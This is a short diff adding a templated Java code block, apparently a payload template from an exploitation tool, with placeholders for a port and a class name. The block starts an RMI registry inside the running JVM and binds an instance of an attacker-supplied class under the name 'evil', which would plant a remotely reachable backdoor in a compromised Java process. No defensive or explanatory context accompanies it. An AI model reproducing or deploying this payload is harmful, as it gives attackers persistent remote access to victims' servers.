@@ -1,0 +1,16 @@
+{
+    if(FLAG==true)
+        return;
+    FLAG=true;
+    try {
+        java.rmi.registry.LocateRegistry.createRegistry({{{port}}});
+    } catch (Exception e) {
+        System.out.println("be used");
+    }
+    try {
+        java.rmi.registry.Registry registry = java.rmi.registry.LocateRegistry.getRegistry({{{port}}});
+        registry.bind("evil", (java.rmi.Remote) Class.forName("{{{className}}}").newInstance());
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+}
